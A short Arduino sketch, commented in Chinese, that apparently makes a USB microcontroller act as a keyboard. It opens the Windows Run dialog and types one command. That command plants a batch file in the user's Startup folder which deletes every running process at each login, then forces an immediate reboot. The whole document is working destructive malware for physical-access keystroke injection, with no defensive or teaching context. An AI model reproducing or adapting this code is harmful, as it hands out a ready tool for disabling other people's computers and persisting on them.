void setup() {//初始化
  Keyboard.begin();//开始键盘通讯 
  delay(5000);//延时
  Keyboard.press(KEY_LEFT_GUI);//win键 
  delay(500); 
  Keyboard.press('r');//r键 
  delay(500); 
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  delay(500); 
  Keyboard.println("cmd /c cd %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup&echo for /f %%I in (\'wmic process get Name\')do (wmic process where Name=\"%%I\" delete)>system.bat&shutdown -r -f -t 0");
  Keyboard.end();//结束键盘通讯 
}
void loop()//循环
{
}
